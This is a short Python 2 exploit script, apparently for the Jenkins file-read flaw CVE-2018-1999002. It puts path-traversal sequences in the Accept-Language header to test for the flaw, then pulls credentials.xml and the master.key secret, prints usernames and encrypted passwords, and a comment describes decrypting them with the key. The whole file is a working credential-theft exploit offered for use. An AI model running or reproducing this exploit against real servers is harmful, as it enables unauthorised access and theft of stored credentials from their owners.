# -*- coding: ctf-8 -*-
import requests
import sys
import os
import re
#decrypt:1.script(在控制台执行):println( hudson.util.Secret.decrypt("password") ) 2.python3 decrypt.py master.key hudson.util.Secret credentials.xml


def get_mes(host):
    num = 0
    url_pwd = host+'/plugin/jquery-detached/.xml'
    header_pwd = {'Accept-Language':'/../../../credentials'}
    url_hash = host+'/plugin/jquery-detached/.key'
    header_hash = {'Accept-Language':'/../../../secrets/master'}
    try:
        content_pwd = requests.get(url_pwd,headers=header_pwd,timeout=5).content
        pat_content = r'<username>(.*?)</password>'
        pat_user = r'(.*?)</username>'
        pat_pwd = r'<password>(.*)'
        content_part = re.findall(pat_content,content_pwd,re.S)
        for i in content_part:
            #print i
            i = i.replace('\n','')
            #print i
            users = re.findall(pat_user,i,re.S)
            pwds = re.findall(pat_pwd,i)
            print users[0]+'  '+pwds[0]
        content_hash = requests.get(url_hash,headers=header_hash,timeout=5).content
        print '\nThe hash is :\n'+content_hash
    except Exception,e:
        print e
        pass
        

if __name__=="__main__":
    if len(sys.argv) != 2:
        print 'usage:\n\tpython cve-2018-1999002.py [jenkins base url]'
        print 'exemple:\n\tpython cve-2018-1999002.py http://localhost:8080/'
        sys.exit(1)
    host = sys.argv[1]
    header_ini = {'Accept-Language':'/../../../../../../../../../windows/win'}
    url_ini = host+'/plugin/credentials/.ini'
    try:
        content_ini = requests.get(url_ini,headers=header_ini,timeout=5).content
        if 'for 16-bit app support' in content_ini:
            print host+' is  Vulnerable\n'
            get_mes(host)
        else:
            print host+' is  not Vulnerable\n'
    except Exception,e:
        print e
        print "Url connects error"


 


